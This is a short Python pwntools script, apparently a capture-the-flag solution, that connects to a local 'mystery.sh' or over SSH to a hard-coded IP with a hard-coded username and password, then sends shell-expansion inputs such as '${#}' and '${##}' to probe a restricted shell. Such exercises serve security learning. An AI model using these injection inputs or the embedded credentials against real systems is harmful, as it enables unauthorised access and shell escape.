from pwn import *

DEBUG = True
if DEBUG:
	p = process('./mystery.sh')
else:
	p = ssh(host='51.254.114.246', user='special', password='b8f07e1000c719c6a7febde4ec0ab24d')

p.sendlineafter('>> ', 'a')
a = p.recvline()
print a
p.sendlineafter('>> ', '${#}')
p.sendlineafter('>> ', '${##}')